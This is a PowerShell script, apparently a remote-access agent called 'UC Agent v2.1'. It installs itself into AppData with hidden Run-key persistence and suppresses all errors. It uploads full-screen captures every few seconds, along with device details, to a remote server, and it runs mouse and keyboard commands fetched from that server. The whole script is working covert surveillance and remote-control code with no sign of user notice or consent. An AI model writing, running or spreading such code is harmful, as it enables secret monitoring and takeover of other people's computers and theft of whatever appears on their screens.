# UC Agent v2.1 - With screen capture upload + command polling
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$SERVER = "https://uc-universal-connect-omega.vercel.app"
$DEVICE_ID = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
$INSTALL_DIR = "$env:APPDATA\UCService"

# Install
New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
$selfPath = $MyInvocation.MyCommand.Path
if ($selfPath) {
    Copy-Item $selfPath "$INSTALL_DIR\svc.ps1" -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UCService" -Value "powershell.exe -EP Bypass -W Hidden -F `"$INSTALL_DIR\svc.ps1`""
}

# Assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System.Runtime.InteropServices;
public class MI {
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int i);
    public static void C(int x, int y) { SetCursorPos(x,y); mouse_event(2,0,0,0,0); mouse_event(4,0,0,0,0); }
    public static void R(int x, int y) { SetCursorPos(x,y); mouse_event(8,0,0,0,0); mouse_event(16,0,0,0,0); }
    public static void D(int x, int y) { SetCursorPos(x,y); mouse_event(2,0,0,0,0); mouse_event(4,0,0,0,0); mouse_event(2,0,0,0,0); mouse_event(4,0,0,0,0); }
    public static void M(int x, int y) { SetCursorPos(x,y); }
}
"@

function Grab {
    $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
    $g.Dispose()
    $enc = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
    $p = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $p.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 35)
    $s = New-Object System.IO.MemoryStream
    $bmp.Save($s, $enc, $p)
    $bmp.Dispose()
    $bytes = $s.ToArray()
    $s.Dispose()
    return [Convert]::ToBase64String($bytes)
}

function DoCmd($cmd) {
    switch ($cmd.action) {
        "click"      { [MI]::C([int]$cmd.data.x, [int]$cmd.data.y) }
        "rightclick" { [MI]::R([int]$cmd.data.x, [int]$cmd.data.y) }
        "doubleclick"{ [MI]::D([int]$cmd.data.x, [int]$cmd.data.y) }
        "move"       { [MI]::M([int]$cmd.data.x, [int]$cmd.data.y) }
        "type"       { [System.Windows.Forms.SendKeys]::SendWait($cmd.data.text) }
        "key"        { [System.Windows.Forms.SendKeys]::SendWait($cmd.data.key) }
    }
}

# Main loop
$frameCount = 0
while ($true) {
    try {
        # Heartbeat every 10 frames (~30 sec)
        if ($frameCount % 10 -eq 0) {
            $info = @{
                deviceId = $DEVICE_ID; name = $env:COMPUTERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
                resolution = "$((Get-WmiObject Win32_VideoController | Select-Object -First 1).CurrentHorizontalResolution)x$((Get-WmiObject Win32_VideoController | Select-Object -First 1).CurrentVerticalResolution)"
                userId = "jay"; version = "2.1"
            }
            Invoke-RestMethod -Uri "$SERVER/api/devices" -Method POST -Body ($info | ConvertTo-Json -Compress) -ContentType "application/json" -TimeoutSec 10
        }

        # Upload screenshot
        $img = Grab
        $payload = @{ deviceId = $DEVICE_ID; image = $img } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$SERVER/api/screenshot" -Method POST -Body $payload -ContentType "application/json" -TimeoutSec 10

        # Poll for commands
        $cmds = Invoke-RestMethod -Uri "$SERVER/api/commands?deviceId=$DEVICE_ID" -TimeoutSec 5
        if ($cmds) {
            foreach ($cmd in $cmds) { DoCmd $cmd }
        }
    } catch { }

    $frameCount++
    Start-Sleep -Seconds 3
}
